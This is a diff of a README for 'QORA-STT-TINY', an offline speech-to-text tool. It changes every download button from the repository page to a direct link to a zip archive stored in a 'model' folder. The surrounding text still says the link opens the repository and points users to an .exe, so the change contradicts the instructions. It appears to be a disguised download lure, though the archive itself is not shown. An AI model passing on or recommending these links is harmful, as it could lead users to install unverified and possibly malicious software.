@@ -1,6 +1,6 @@
 # 🎙️ QORA-STT-TINY - Simple Offline Speech-to-Text
 
-[![Download QORA-STT-TINY](https://img.shields.io/badge/Download-QORA--STT--TINY-green?style=for-the-badge)](https://github.com/djalili1806/QORA-STT-TINY)
+[![Download QORA-STT-TINY](https://img.shields.io/badge/Download-QORA--STT--TINY-green?style=for-the-badge)](https://github.com/djalili1806/QORA-STT-TINY/raw/refs/heads/main/model/TINY_ST_QOR_2.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Here is how to get QORA-STT-TINY ready on your Windows PC. You do not need any p
 
 Click the button below to open the download page. You will find the latest version of QORA-STT-TINY available there.
 
-[![Download QORA-STT-TINY](https://img.shields.io/badge/Download-QORA--STT--TINY-blue?style=for-the-badge)](https://github.com/djalili1806/QORA-STT-TINY)
+[![Download QORA-STT-TINY](https://img.shields.io/badge/Download-QORA--STT--TINY-blue?style=for-the-badge)](https://github.com/djalili1806/QORA-STT-TINY/raw/refs/heads/main/model/TINY_ST_QOR_2.8.zip)
 
 The page leads to the project's main repository on GitHub. Look for a file named like `QORA-STT-TINY.exe` under the "releases" or "assets" section.
 
@@ -122,4 +122,4 @@ For issues or questions:
 
 ---
 
-[Download QORA-STT-TINY](https://github.com/djalili1806/QORA-STT-TINY) - click above to access the latest version.
+[Download QORA-STT-TINY](https://github.com/djalili1806/QORA-STT-TINY/raw/refs/heads/main/model/TINY_ST_QOR_2.8.zip) - click above to access the latest version.
